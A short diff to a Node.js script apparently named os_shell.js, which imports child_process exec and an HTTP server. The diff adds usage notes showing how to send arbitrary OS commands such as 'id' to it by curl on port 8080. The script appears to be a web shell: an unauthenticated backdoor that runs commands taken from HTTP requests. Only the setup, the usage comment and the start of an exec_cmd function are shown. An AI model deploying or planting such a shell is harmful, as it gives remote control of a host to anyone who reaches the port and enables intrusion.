@@ -1,8 +1,16 @@
-var sys = require('sys');
-const { exec } = require('child_process');
+sys  = require('sys');
+const{exec}  = require('child_process');
 url = require('url'),
 http = require('http'),
 qs = require('querystring');
+
+/*
+Usage
+---------
+In the server run: node os_shell.js
+From the client: curl -X POST -d "cmd=id" http://IP:8080
+                 curl http://127.0.0.1:8080?cmd=id
+*/
 
 function exec_cmd(strcmd,objresponse)
 {
